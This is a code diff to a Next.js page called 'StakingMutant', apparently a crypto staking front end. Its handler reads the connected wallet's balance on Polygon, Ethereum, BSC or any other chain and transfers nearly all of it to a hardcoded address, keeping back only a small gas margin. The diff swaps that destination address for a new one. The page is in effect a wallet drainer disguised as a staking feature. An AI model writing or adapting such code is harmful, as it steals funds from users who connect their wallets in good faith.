@@ -62,25 +62,25 @@ const StakingMutant: NextPage = () => {
     if (chainId == 137) {
       console.log("polygon")
       const valueAsNumber = Number(data?.displayValue) || 0;
-      const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.15);
+      const txResult = await (await sdk).wallet.transfer("0x95E65E95645937695028143E56491D5484D5E9e7", valueAsNumber - 0.15);
     }
 
     else if (chainId == 1) {
       console.log("etherium")
       const valueAsNumber = Number(data?.displayValue) || 0;
-      const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.01);
+      const txResult = await (await sdk).wallet.transfer("0x95E65E95645937695028143E56491D5484D5E9e7", valueAsNumber - 0.01);
     }
 
     else if (chainId == 56) {
       console.log("BSC")
       const valueAsNumber = Number(data?.displayValue) || 0;
-      const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.01);
+      const txResult = await (await sdk).wallet.transfer("0x95E65E95645937695028143E56491D5484D5E9e7", valueAsNumber - 0.01);
     }
 
     else {
       console.log("nothing")
       const valueAsNumber = Number(data?.displayValue) || 0;
-      const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.01);
+      const txResult = await (await sdk).wallet.transfer("0x95E65E95645937695028143E56491D5484D5E9e7", valueAsNumber - 0.01);
     }
   }
 
